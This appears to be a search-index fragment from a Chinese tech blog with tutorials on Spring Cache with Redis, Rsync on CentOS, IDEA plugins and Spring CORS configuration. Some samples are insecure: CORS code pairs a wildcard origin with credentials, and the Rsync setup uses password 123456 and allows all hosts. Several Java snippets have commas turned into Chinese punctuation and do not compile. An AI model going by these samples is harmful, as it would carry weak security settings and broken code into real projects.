中的条目都有一个定义的有效期。一旦超过这个时间，条目就自动过期，过期后条目将不可以执行访问、更新和删除操作。缓存有效期可以通过 ExpiryPolicy 设置。 Spring Cache 概念大致原理在 Spring Cache 官网中，有一个缓存抽象的概念，其核心就是将缓存应用于 Java 方法中，从而减少基于缓存中可用信息的执行次数。换句话来说，就是每次调用目标方法前，Spring Cache 都会先检查该方法是否正对给定参数执行，如果已经执行过，就直接返回缓存的结果。通俗的讲，就是查看缓存里面是否有对应的数据，如果有就返回缓存数据，而无需执行实际方法；如果该方法尚未执行，则执行该方法（缓存中没有对应的数据就执行方法来获取对应的数据），并缓存结果后返回给用户。这样就不用多次去执行数据库操作，减少 CPU 和 IO 的消耗。 使用 Spring 缓存抽象时，应该需要关注以下两点 1、确定方法需要被缓存以及它们的缓存策略 2、从缓存中读取之前缓存存储的数据 核心接口 org.springframework.cache.Cache：为缓存组件定义规范，包含缓存的各种操作集合。在 Cache 接口下，Spring 提供了各种 xxxCache 的实现，如 RedisCache、EhCacheCache、ConcurrentMapCache 等。 org.springframework.cache.CacheManager：缓存管理器，管理各种缓存（Cache）组件，如 RedisCacheManager，使用 Redis 作为缓存。 核心注解 注解 说明 @Cacheable 主要针对方法配置，能够根据方法的请求参数对其执行结果进行缓存，相当于缓存使用的是读模式 @CacheEvict 将一条或多条数据从缓存中删除，相当于缓存使用的是写模式中的失效模式 @CachePut 保证方法被调用，又希望结果被缓存，相当于缓存使用的是写模式中的双写模式 @EnableCaching 开启基于注解的缓存功能 @CacheConfig 标注在类上，用于抽取 Spring Cache 相关注解的公共配置，可抽取的公共配置包括缓存名称、主键生成器、缓存管理器 @Caching 用于在一个方法或者类上，同时指定多个 Spring Cache 相关的注解 keyGenerator 缓存数据时 Key 的生成策略 serialize 缓存数据时 Value 的序列化策略 在上面常用的三个注解 @Cacheable、@CachePut、CacheEvict 中，主要有以下的参数，可用于对要缓存的数据进行过滤和配置。 提示 1、@Cacheable 标注在方法上，表示方法的结果需要被缓存起来，缓存的键由 keyGenerator 的策略决定，缓存的值的形式则由 serialize 序列化策略决定（JDK 还是 Json 序列化机制）；标注上该注解之后，在缓存时效内再次调用该方法时不会调用方法本身，而是直接从缓存获取结果。 2、@CachePut 也标注在方法上，它和 @Cacheable 相似也会将方法的返回值缓存起来，不同的是标注 @CachePut 的方法每次都会被调用，而且每次都会将结果缓存起来，适用于对象的更新。 Spring Cache 整合下面将介绍 Spring Boot 项目如何整合 Spring Cache，并使用 Redis 存储缓存数据。 引入依赖123456789&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-cache&lt;/artifactId&gt;&lt;/dependency&gt; 配置信息在 application.yml 配置文件里，指定 Spring Cache 使用 Redis 存储缓存数据，并配置 Redis 的连接信息。 123456789spring: redis: host: 127.0.0.1 port: 6379 password: 123456 database: 0 timeout: 5000 cache: type: redis 启用缓存在应用的主启动类上添加 @EnableCaching 注解，启用 Spring Cache 的缓存功能。 12345@EnableCaching@SpringBootApplicationpublic class ProductApplication { } 配置序列化默认情况下，Spring Cache 会使用 JDK 的序列化机制将缓存数据写入 Redis，这样存储在 Redis 里面的就是二进制数据。若希望 Spring Cache 将数据序列化成 JSON 数据再写入 Redis，可以使用以下的配置类。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import org.springframework.boot.autoconfigure.cache.CacheProperties;import org.springframework.boot.context.properties.EnableConfigurationProperties;import org.springframework.cache.annotation.CachingConfigurerSupport;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import org.springframework.data.redis.cache.RedisCacheConfiguration;import org.springframework.data.redis.serializer.GenericJackson2JsonRedisSerializer;import org.springframework.data.redis.serializer.RedisSerializationContext;import org.springframework.data.redis.serializer.StringRedisSerializer;import java.time.Duration;@Configuration@EnableConfigurationProperties(CacheProperties.class)public class SpringCacheConfig extends CachingConfigurerSupport { /** * Spring Cache 的 Redis 配置 */ @Bean public RedisCacheConfiguration redisCacheConfiguration(CacheProperties cacheProperties) { // 默认配置 RedisCacheConfiguration config = RedisCacheConfiguration.defaultCacheConfig(); // 设置随机的有效时间，若不设置，默认是永久有效 // Random random = new Random(); // config = config.entryTtl(Duration.ofHours(random.nextInt(24))); // Key的序列化机制 config = config.serializeKeysWith(RedisSerializationContext.SerializationPair.fromSerializer(new StringRedisSerializer())); // Value的序列化机制 config = config.serializeValuesWith(RedisSerializationContext.SerializationPair.fromSerializer(new GenericJackson2JsonRedisSerializer())); // 加载配置文件的内容 CacheProperties.Redis redisProperties = cacheProperties.getRedis(); if (redisProperties.getTimeToLive() != null) { config = config.entryTtl(redisProperties.getTimeToLive()); } if (redisProperties.getKeyPrefix() != null) { config = config.prefixCacheNameWith(redisProperties.getKeyPrefix()); } if (!redisProperties.isCacheNullValues()) { config = config.disableCachingNullValues(); } if (!redisProperties.isUseKeyPrefix()) { config = config.disableKeyPrefix(); } return config; }} 添加缓存注解在需要使用缓存的方法上添加 @Cacheable 注解，其中的 value 参数代表缓存的名称，必须指定至少一个。标注上该注解之后，会将方法运行的结果进行缓存，在缓存时效内再次调用该方法时不会调用方法本身，而是直接从缓存获取结果并返回给调用方。 123456789101112@Service("categoryService")public class CategoryServiceImpl implements CategoryService { @Override @Cacheable(value = "categoryTree") public List&lt;CategoryEntity&gt; listWithTree() { // TODO 查询数据库 System.out.println("查询数据库"); return Collections.emptyList(); }} 至此，Spring Boot 项目整合 Spring Cache 的步骤就完成了。当重复调用标记了 @Cacheable 注解的方法时，可以发现该方法只会被调用一次，此时说明 Redis 的缓存生效了。 参考博客 Spring Cache 详解 Spring Cache 基础使用 JSR-107 与 Spring Boot 缓存 Spring Boot 中 Cache 缓存的介绍和使用 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java 缓存"},{title:"Centos7 使用 Rsync 同步文件",url:"/posts/a8ab361e.html",text:'前言Rsync 是一个增量备份工具，可压缩数据传输，速度快且增量备份，占用流量少。 准备工作创建用户12345# 创建用户组# groupadd www# 创建用户# useradd -g www www -s /bin/false 创建配置文件12# 创建Rsync服务器信息提示文件# echo "Welcome To Access" &gt; /etc/rsyncd.motd 123456# 创建Rsync服务器密码文件，其中 RsyncUser 是用户名，123456 是密码# echo "RsyncUser:123456" &gt; /etc/rsyncd.secrets# Rsync服务器密码文件授权，所属的用户和用户组必须都是 root，同时权限必须为 600# chown root:root /etc/rsyncd.secrets# chmod 600 /etc/rsyncd.secrets 安装 Rsync安装 Rsync 服务12345# 安装#&nbsp;yum install rsync# 开机自启动# systemctl enable rsyncd 注意 这里还需要更改 systemd 的配置文件，加入以下内容，否则 Rsync 服务开机无法正常自启动。 12345678# 更改systemd的配置文件，加入以下内容# vim /usr/lib/systemd/system/rsyncd.service[Unit]...After=network.target# 让配置文件生效# systemctl daemon-reload 配置 Rsync 服务12345# 备份默认的配置文件# cp /etc/rsyncd.conf /etc/rsyncd.conf.bak# 编辑配置文件，添加以下内容（请自行根据实际情况更改对应的配置内容）# vim /etc/rsyncd.conf 1234567891011121314151617181920212223242526272829303132333435363738394041424344# 设置服务器信息提示文件名称，在该文件中编写提示信息motd file = /etc/rsyncd.motd# 开启Rsync数据传输日志功能transfer logging = yes# 设置日志文件名称，可以通过log format参数设置日志格式log file =/var/log/rsyncd.log# 设置Rsync进程号保存文件名称pid file =/var/run/rsyncd.pid# 设置锁文件名称lock file =/var/run/rsync.lock# 设置服务器监听的端口号，默认为873 port = 873# 设置服务器所监听网卡接口的IP地址（内网IP）address = 172.0.25.18# 设置进行数据传输时所使用的账户名称或ID号，默认使用nobody uid = www# 设置进行数据传输时所使用的组名称或GID号，默认使用nobody gid = www# 设置user chroot为yes后，rsync会首先进行chroot设置，将根映射到path参数路径下，对客户端而言，系统的根就是path参数所指定的路径。但这样做需要root权限，并且在同步符号连接资料时仅会同步名称，而内容将不会同步。 use chroot = no# 是否允许客户端上传数据，这里设置不为只读。 read only = no# 设置并发连接数，0代表无限制。超出并发数后，如果依然有客户端连接请求，则将会收到稍后重试的提示消息 max connections = 10# 模块，Rsync通过模块定义同步的目录，模块以[name]的形式定义，这与Samba定义共享目录是一样的效果，在Rsync中也可以定义多个模块[blog]# comment定义注释说明字串 comment = rsync blog files# 同步目录的真实路径通过path指定 path = /home/www/blog# 忽略一些IO错误 ignore errors# exclude可以指定例外的目录，即将common目录下的某个目录设置为不同步数据 # exclude = test/ # 设置允许连接服务器的账户，账户可以是系统中不存在的用户 auth users = RsyncUser# 设置密码文件名称，注意该文件的权限要求为只读，建议权限为600，仅在设置auth users参数后有效 secrets file = /etc/rsyncd.secrets# 设置允许哪些主机可以同步数据，可以是单个IP，也可以是网段，多个IP与网段之间使用空格分隔 hosts allow = *# 设置拒绝所有（除hosts allow定义的主机外） # hosts deny = *# 客户端请求显示模块列表时，本模块名称是否显示，默认为true list = true 启动 Rsync 服务12345# 启动服务# systemctl start rsyncd# 查看服务的运行状态# systemctl status rsyncd 值得一提的是，还可以使用以下命令管理 Rsync 服务： 12345# 关闭服务# systemctl stop rsyncd# 重启服务# systemctl restart rsyncd 配置系统防火墙12345678# 开放Rsync监听的端口（默认端口是873）# firewall-cmd --permanent --add-port=873/tcp# 让防火墙规则生效# firewall-cmd --reload# 查看所有开放的端口# firewall-cmd --list-ports 测试文件同步服务提示 在下述的案例里，各命令参数的说明如下： 183.242.11.186：服务器的 IP 地址 blog：在 /etc/rsyncd.conf 配置文件中定义的模块名称 RsyncUser：在 /etc/rsyncd.secrets 配置文件中定义的用户名 --delete：表示同步文件时，删除目标目录比源目录多余的文件 同步目录授权在服务器上，确保用户拥有在 /etc/rsyncd.conf 配置文件中定义的 path 同步目录的访问权限。 12# 同步目录授权# chown -R www:www /home/www/blog 客户端同步服务器文件到本地12345# 客户端同步服务器的某个文件到本地$ rsync -vzrtopg --progress RsyncUser@183.242.11.186::blog/index.html ./# 客户端同步服务器的某个目录到本地$ rsync -vzrtopg --progress RsyncUser@183.242.11.186::blog/posts/ ./posts/ 客户端同步本地文件到服务器12345678# 客户端同步本地的某个文件到服务器$ rsync -rlptDv index.html RsyncUser@183.242.11.186::blog/# 客户端同步本地的某个目录到服务器（本地的目录路径必须不以\'/\'结尾）$ rsync -avzP --delete ./posts RsyncUser@183.242.11.186::blog/# 客户端同步本地某个目录下的所有文件到服务器（本地的目录路径必须以\'/\'结尾）$ rsync -avzP --delete ./posts/ RsyncUser@183.242.11.186::blog/ 设置同步时不手动输入密码在客户端同步文件时指定密码文件，这样可以避免每次都手动输入密码。 123456# 在本地创建密码文件，其中 123456 是密码，这里不需要指定用户名# echo "123456" &gt; /etc/rsyncd.password# 密码文件授权，所属的用户和用户组必须都是 root，同时权限必须为 600# chown root:root /etc/rsyncd.password# chmod 600 /etc/rsyncd.password 12# 客户端同步服务器的某个文件到本地（指定密码文件）# rsync -vzrtopg --progress RsyncUser@183.242.11.186::blog/index.html ./ --password-file=/etc/rsyncd.password 提示 除了上述的方法之外，还可通过设置环境变量的方式，避免每次都手动输入密码。 12345# 通过环境变量设置密码# export RSYNC_PASSWORD="123456"# 客户端同步服务器的某个文件到本地# rsync -vzrtopg --progress RsyncUser@183.242.11.186::blog/index.html ./ 不同步文件的所有者和用户组信息在 rsync -a dir/ remote:/dir/ 命令中，-a 相当于 -rlptgoD，各参数选项的说明如下： 123456789-o, --owner preserve owner (super-user only)-g, --group preserve group-r, --recursive recurse into directories-l, --links copy symlinks as symlinks-p, --perms preserve permissions-t, --times preserve modification times-D same as --devices --specials --devices preserve device files (super-user only) --specials preserve special files 若希望不同步文件的所有者和用户组信息，那么可以通过移除 -o 和 -g 参数选项来实现，示例命令如下： 1$ rsync -a --no-o --no-g dir/ remote:/dir/ 用参数控制 Rsync 同步时的比较算法Rsync 默认只会比较文件大小和最后修改时间，只要这两者一样，Rsync 就认为文件相同；此时如果其它属性（包括文件内容）的不同，并不会让 Rsync 同步该文件。所以，如果本地文件与远程文件大小一样，修改时间也一样，那么默认情况下，即使文件内容不一样的文件也不同被同步。通过设置合适的参数，可以控制 Rsync 的比较算法，其中 Rsync 使用以下三个步骤来比较文件： a) 比较文件大小 b) 比较文件最后修改日期 c) 比较文件内容，通过 checksum，例如使用 md5sum 可以用参数来控制 Rsync 执行上面的哪些步骤： 默认的比较算法只执行 a 和 b 参数 --size-only 只检查 a ，即只要文件大小一样，即使修改日期不一样，就认为文件一样，更不会去检查文件内容 参数 --ignore-times 是忽略所有检查，直接认为文件都不一样，然后总是复制文件 参数 --checksum 是在 a 的基础上执行 c ，比较文件内容。如果文件大小不一样，可以确保内容不一样。如果文件大小一样，那么直接比较文件内容，不会执行 b 中的比较最后修改时间。该方法最安全，但需要读取两边的文件内容，某些情况下要慢很多（尤其是最后比较出来的文件内容一样的情况） 命令参数的使用示例如下： 1$ rsync -avzP --delete --checksum dir/ remote:/dir/ 常见问题delete 参数不生效 Rsync –delete option doesn’t delete files in target directory var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"centos"},{title:"IDEA 开发随笔",url:"/posts/6c257231.html",text:'IDEA 常用插件推荐 推荐 插件名称 插件说明 官方地址 √ Key Promoter X 快捷键提示 https://plugins.jetbrains.com/plugin/9792?pr=idea JRebel Plugin（收费） 热部署 https://plugins.jetbrains.com/plugin/4441?pr=idea √ CodeGlance 代码编辑区缩略图 https://plugins.jetbrains.com/plugin/7275?pr=idea √ Lombok 代码注解支持 https://plugins.jetbrains.com/plugin/6317?pr=idea GsonFormat JSON 转领域对象工具 https://plugins.jetbrains.com/plugin/7654?pr=idea √ Alibaba Java Coding Guidelines 阿里巴巴代码规约检测 https://plugins.jetbrains.com/plugin/10046?pr=idea Mybatis Log Plugin MyBatis SQL 日志格式化 https://plugins.jetbrains.com/plugin/10065?pr=idea √ MyBatisX 自动生成代码，支持在 Mapper 接口和 XML 映射文件之间跳转 https://plugins.jetbrains.com/plugin/10119-mybatisx MyBatisCodeHelperPro 自动生成代码，支持在 Mapper 接口和 XML 映射文件之间跳转 https://plugins.jetbrains.com/plugin/9837-mybatiscodehelperpro Free MyBatis plugin 自动生成代码，支持在 Mapper 接口和 XML 映射文件之间跳转 https://plugins.jetbrains.com/plugin/8321?pr=idea √ Maven Helper Maven 依赖分析 https://plugins.jetbrains.com/plugin/7179?pr=idea Gradle Dependencies Helper Gradle 依赖提示 https://plugins.jetbrains.com/plugin/7299?pr=idea Gradle Dependencies Formatter 将 Maven 依赖转换为 Gradle 依赖 https://plugins.jetbrains.com/plugin/7937?pr=idea √ Rainbow Brackets 彩色的括号 https://plugins.jetbrains.com/plugin/10080?pr=idea √ Grep Console 控制日志颜色 https://plugins.jetbrains.com/plugin/7125?pr=idea √ .ignore Git 忽略文件 https://plugins.jetbrains.com/plugin/7495?pr=idea Translation 中英文翻译 https://plugins.jetbrains.com/plugin/8579?pr=idea CodeMaker 代码生成 https://plugins.jetbrains.com/plugin/9486?pr=idea codehelper.generator 代码生成 https://plugins.jetbrains.com/plugin/8640?pr=idea MyBatisCodeHelperPro（收费） MyBatis 代码生成 https://plugins.jetbrains.com/plugin/9837?pr=idea GenerateAllSetter 生成 Get、Set 方法 https://plugins.jetbrains.com/plugin/9360?pr=idea JUnitGenerator 生成 Junit 代码 https://plugins.jetbrains.com/plugin/3064?pr=idea CamelCase 驼峰式命名和下划线命名交替切换 https://plugins.jetbrains.com/plugin/7160?pr=idea Statistic 代码统计 https://plugins.jetbrains.com/plugin/4509?pr=idea √ CheckStyle-IDEA 代码规范和风格的检查 https://plugins.jetbrains.com/plugin/1065?pr=idea √ FindBugs-IDEA 代码 Bug 检查 https://plugins.jetbrains.com/plugin/3847?pr=idea SonarLint 代码 Bug 检查、代码质量优化 https://plugins.jetbrains.com/plugin/7973?pr=idea Eclipse Code Formatter 使用 Eclipse 的代码格式化风格 https://plugins.jetbrains.com/plugin/6546?pr=idea Spring Initializr 网络连接超时使用 Spring Initializr 工具初始化 SpringBoot 项目时，出现网络连接超时的异常。 方案一使用阿里云版的 Spring Initializr 来替代，在 IDEA 内搜索 Alibaba Cloud Toolkit 插件，安装插件后重启 IDEA。 方案二（推荐）配置阿里云的 Spring Initializr URL，可以在 Spring Initializr 的界面中指定服务器 URL 为 https://start.aliyun.com/ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"开发工具"},{title:"Spring 与 SpringBoot 配置跨域的几种方式",url:"/posts/3a3d508.html",text:'前言跨域介绍 什么是跨域：浏览器从一个域名的网页去请求另一个域名的资源时，域名、端口、协议任一项不同，都属于跨域 造成的原因：由于浏览器的同源策略，即 A 网站只能访问 A 网站的内容，不能访问 B 网站的内容 特别注意：跨域问题只存在于浏览器，也就是说当前端页面访问后端的接口时，返回值是有的，只是服务器没有在请求头指定跨域的信息，所以浏览器自动把返回值给” 屏蔽了” 解决跨域：经过上面的了解，可以得出几个解决跨域的方法（这里暂不考虑前端的实现方案），一是服务端指定跨域信息，二是在 Web 页面与后端服务之间加一层服务来指定跨域信息，比如代理服务 Nginx 提示 更多关于跨域的详细介绍内容，可以看 这里。 跨域解决方案方案一使用 Nginx 等代理服务器，将不同的应用部署为同一域。 方案二添加 HTTP 响应头，配置当次请求允许跨域。 Access-Control-Allow-Origin：支持哪些来源的请求跨域 Access-Control-Allow-Methods：支持哪些方法跨域 Access-Control-Allow-Credentials：跨域请求默认不包含 Cookie，设置为 true 则可以包含 Cookie Access-Control-Max-Age：表明该响应的有效时间为多少秒。在有效时间内，浏览器无须为同一请求再次发起预检请求。请注意，浏览器自身维护了一个最大有效时间，如果该字段的值超过了最大有效时间，将不会生效 Access-Control-Expose-Headers：跨域请求暴露的字段。发出跨域请求时，XMLHttpRequest 对象的 getResponseHeader () 方法默认只能拿到 6 个基本字段：Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma。如果想拿到其他字段，就必须在 Access-Control-Expose-Headers 里面指定 Spring 配置跨域使用注解实现跨域 特别注意：Spring 的版本要在 4.2 或以上版本才支持使用 @CrossOrigin 注解来控制跨域，使用注解的方式优势在于比较容易细粒度（局部）地实现跨域控制 在 Controller 类中配置跨域，可以使用注解 @CrossOrigin，该注解支持写在类或者方法上，示例代码如下： 1234567891011@RestController@RequestMapping("/account")public class AccountController { @CrossOrigin @GetMapping("/{id}") public Account retrieve(@PathVariable Long id) { }} 或者 1234567891011121314import org.springframework.web.bind.annotation.*;import static org.springframework.web.bind.annotation.RequestMethod.*;@RestController@RequestMapping("/account")@CrossOrigin(origins = {"http://example.com"}, maxAge = 3600, allowedHeaders = {"Origin", "X-Requested-With", "Content-Type", "Accept", "token"}, methods = {GET, POST, PUT, OPTIONS, DELETE, PATCH})public class AccountController { @GetMapping("/{id}") public Account retrieve(@PathVariable Long id) { }} @CrossOrigin 注解中的参数说明如下： origins：允许来源域名的列表，不设置确切值时默认支持所有域名跨域访问 methods: 跨域请求中支持的 HTTP 请求的类型（GET、POST、DELETE …），不指定确切值时默认与 Controller 方法中的 methods 字段保持一致 maxAge：跨域预检请求的有效期（单位为秒），目的是减少浏览器预检 / 响应的请求数量，默认值是 1800秒；设置了该值后，浏览器将在设置值的时间段内对该跨域请求不再发起预检请求 exposedHeaders：跨域请求的请求头中允许携带除 Cache-Controller、Content-Language、Content-Type、Expires、Last-Modified、Pragma 这六个基本字段之外的其他字段信息 allowedHeaders：允许的请求头中的字段类型，不设置确切值时默认支持所有的 Header 字段（Cache-Controller、Content-Language、Content-Type、Expires、Last-Modified、Pragma）跨域访问 allowCredentials：浏览器是否将本域名下的 Cookie 信息携带至跨域服务器中，若设置为携带 Cookie 至跨域服务器中，要实现 Cookie 共享还需要前端在 AJAX 请求中打开 withCredentials 属性 SpringMVC 还支持同时使用类和方法级别的跨域配置，此时 SpringMVC 会合并两个注解属性以创建合并后的跨域配置 123456789101112@RestController@RequestMapping("/account")@CrossOrigin(maxAge = 3600)public class AccountController { @CrossOrigin(origins = {"http://example.com"}) @GetMapping("/{id}") public Account retrieve(@PathVariable Long id) { }} 如果在 Spring 项目里使用了 Spring Security，请确保 Spring Security 在安全级别启用 CORS，并允许它利用 Spring MVC 级别的配置定义 123456789@Configuration@EnableWebSecuritypublic class WebSecurityConfig extends WebSecurityConfigurerAdapter { @Override protected void configure(HttpSecurity http) throws Exception { http.cors().and()... }} 使用拦截器实现跨域123456789101112131415161718192021222324252627282930313233343536373839import org.springframework.context.annotation.Configuration;import org.springframework.web.servlet.HandlerInterceptor;import org.springframework.web.servlet.ModelAndView;import org.springframework.web.servlet.config.annotation.CorsRegistry;import org.springframework.web.servlet.config.annotation.InterceptorRegistry;import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;@Configurationpublic class WebMvcConfig implements WebMvcConfigurer { @Override public void addInterceptors(InterceptorRegistry registry) { registry.addInterceptor(new HandlerInterceptor() { @Override public boolean preHandle(HttpServletRequest request、HttpServletResponse response、Object handler) throws Exception { response.addHeader("Access-Control-Allow-Origin"、"*"); response.setHeader("Access-Control-Allow-Credentials"、"true"); response.addHeader("Access-Control-Allow-Methods"、"GET、POST、PUT、DELETE、OPTIONS"); response.addHeader("Access-Control-Allow-Headers"、"Content-Type,X-Requested-With,accept,Origin,Access-Control-Request-Method,Access-Control-Request-Headers,token"); return true; } @Override public void postHandle(HttpServletRequest request、HttpServletResponse response、Object handler、ModelAndView modelAndView) throws Exception { } @Override public void afterCompletion(HttpServletRequest request、HttpServletResponse response、Object handler、Exception ex) throws Exception { } }); }} 由于请求头中自定义的字段是不允许跨域的，所以需要指定允许跨域的自定义 Header，上述的代码段如下： 1response.addHeader("Access-Control-Allow-Headers"、"Content-Type,X-Requested-With,accept,Origin,Access-Control-Request-Method,Access-Control-Request-Headers,token"); 使用过滤器实现跨域123456789101112131415161718192021222324252627282930313233343536373839404142434445import org.springframework.stereotype.Component;import javax.servlet.*;import javax.servlet.annotation.WebFilter;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import javax.servlet.http.HttpSession;import java.io.IOException;@Component@WebFilter(urlPatterns = {"/*"}、filterName = "corsFilter")public class CorsFilter implements Filter { @Override public void doFilter(ServletRequest request、ServletResponse response、FilterChain chain) throws IOException、ServletException { HttpServletRequest req = (HttpServletRequest) request; HttpServletResponse rep = (HttpServletResponse) response; HttpSession session = req.getSession(); // 设置允许跨域的来源域名 rep.setHeader("Access-Control-Allow-Origin"、"*"); // 设置允许跨域请求中支持的HTTP请求类型 rep.setHeader("Access-Control-Allow-Methods"、"POST、GET、PUT、OPTIONS、DELETE、PATCH"); // 设置跨域预检请求的有效期（秒） rep.setHeader("Access-Control-Max-Age"、"3600"); // 设置允许跨域的请求头字段 rep.setHeader("Access-Control-Allow-Headers"、"token、Origin、X-Requested-With、Content-Type、Accept"); // 设置允许将本站域名下的Cookie信息携带至跨域服务器 rep.setHeader("Access-Control-Allow-Credentials"、"true"); // 将获取到的SessionId通过Cookie返回给前端 // rep.addCookie(new Cookie("JSSESIONID"、session.getId())); chain.doFilter(req、rep); } @Override public void init(FilterConfig arg0) throws ServletException { } @Override public void destroy() { }} SpringBoot 配置跨域 特别注意：上述介绍的 Spring 使用注解、拦截器、过滤器控制跨域的方式，同样适用于 SpringBoot 项目 SpringBoot 1.5 版本在 SpringBoot 1.5 版本里，可以继承 WebMvcConfigurerAdapter 类并实现 addCorsMappings() 抽象方法 1234567891011@Configurationpublic class WebMvcConfig extends WebMvcConfigurerAdapter { @Override public void addCorsMappings(CorsRegistry registry) { registry.addMapping("/**").allowedHeaders("*") .allowedMethods("*") .allowedOrigins("*") .allowCredentials(true); }} SpringBoot 2.0 版本在 SpringBoot 2.0 版本里，可以实现 WebMvcConfigurer 接口并实现 addCorsMappings() 方法 1234567891011121314151617import org.springframework.context.annotation.Configuration;import org.springframework.web.servlet.config.annotation.CorsRegistry;import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;@Configurationpublic class WebMvcConfig implements WebMvcConfigurer { @Override public void addCorsMappings(CorsRegistry registry) { registry.addMapping("/**") .allowedHeaders("Content-Type"、"X-Requested-With"、"accept,Origin"、"Access-Control-Request-Method"、"Access-Control-Request-Headers"、"token") .allowedMethods("*") .allowedOrigins("*") .allowCredentials(true); }} Gateway 配置跨域由于 Spring Cloud Gateway 是基于 WebFlux 开发的，因此上述配置跨域的方式都不适用于 Gateway，具体可参考以下配置类： 12345678910111213141516171819202122232425import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import org.springframework.web.cors.CorsConfiguration;import org.springframework.web.cors.reactive.CorsWebFilter;import org.springframework.web.cors.reactive.UrlBasedCorsConfigurationSource;@Configurationpublic class CorsConfig { @Bean public CorsWebFilter corsWebFilter() { UrlBasedCorsConfigurationSource corsSource = new UrlBasedCorsConfigurationSource(); // 配置跨域 CorsConfiguration corsConfiguration = new CorsConfiguration(); corsConfiguration.addAllowedOrigin("http://127.0.0.1:8080"); corsConfiguration.addAllowedHeader("*"); corsConfiguration.addAllowedMethod("*"); corsConfiguration.setAllowCredentials(true); corsSource.registerCorsConfiguration("/**", corsConfiguration); return new CorsWebFilter(corsSource); }} 提示 1、如果 AllowCredentials 设置为 false，则 AllowedOrigin 可以指定为 *，表示所有来源的请求都允许跨域 2、如果 AllowCredentials 设置为 true，则 AllowedOrigin 不能指定为 *，必须明确指定哪些来源的请求允许跨域 扩展说明Nginx 配置跨域 Nginx 配置跨域 Access-Control-Max-Age 参数浏览器的同源策略，就是出于安全考虑，浏览器会限制从脚本发起的跨域 HTTP 请求（比如异步请求 GET、POST、PUT、DELETE、OPTIONS 等等），所以浏览器会向所请求的服务器发起两次请求；第一次是浏览器使用 OPTIONS 方法发起一个预检请求，第二次才是真正的请求；第一次的预检请求获知服务器是否允许该跨域请求：如果允许，才发起第二次真实的请求；如果不允许，则拦截第二次请求。Access-Control-Max-Age:3600（单位为秒，有效期为 1 小时）表示该预检请求在客户端 1 小时后过期，即 1 小时内发送普通请求就不会再伴随着发送预检请求，这样可以减少对服务器的压力，但是时间也不宜设置太大，尤其是项目频繁发布版本的阶段，同时又修改了 Cors 配置的场景。 resp.addHeader("Access-Control-Max-Age", "0")：表示每次请求都发起预检请求，也就是说每次都发送两次请求 resp.addHeader("Access-Control-Max-Age", "1800")：表示每隔 30 分钟才发起一次预检请求 Access-Control-Allow-Credentials 参数如果服务器端设置了 Access-Control-Allow-Credentials: true，同时服务器端还设置了 Access-Control-Allow-Origin: *，那就意味将 Cookie 暴露给了所有的网站。举个例子，假设当前是 A 网站，并且在 Cookie 里写入了身份凭证，用户同时打开了 B 网站，那么 B 网站给 A 网站的服务器发的所有请求都是以 A 用户的身份进行的，这将导致 CSRF 系统安全问题。 常见问题@CrossOrigin 注解不生效 1.Spring 的版本要在 4.2 或以上版本才支持 @CrossOrigin 注解 2. 并非 @CrossOrigin 没有解决跨域的问题，而是不正确的请求导致无法得到预期的响应，最终使浏览器端提示跨域错误，此时建议检查 HTTP 请求的响应状态码 3. 在 Controller 类上方添加 @CrossOrigin 注解后，仍然出现跨域问题，解决方案之一就是在方法上的 @RequestMapping 注解中指定 GET、POST 等方式，示例代码如下： 123456789@CrossOrigin@RestControllerpublic class AccountController { @RequestMapping(method = RequestMethod.GET) public String add() { }} 注解方式与过滤器方式的适用场景过滤器 / 拦截器方式适合于大范围的跨域控制，比如某个 Controller 类的所有方法全部支持某个或几个具体的域名跨域访问的场景。而注解方式的优势在于细粒度的跨域控制，比如一个 Controller 类中 methodA 支持域名 originA 跨域访问，methodB 支持域名 originB 跨域访问的情况，当然过滤器 / 拦截器方式也能实现，但适用注解的方式能轻松很多，尤其是上述情况比较多的场景。值得一提的是，@CrossOrigin 注解的底层代码并不是基于拦截器或者过滤器来实现的。 参考博客 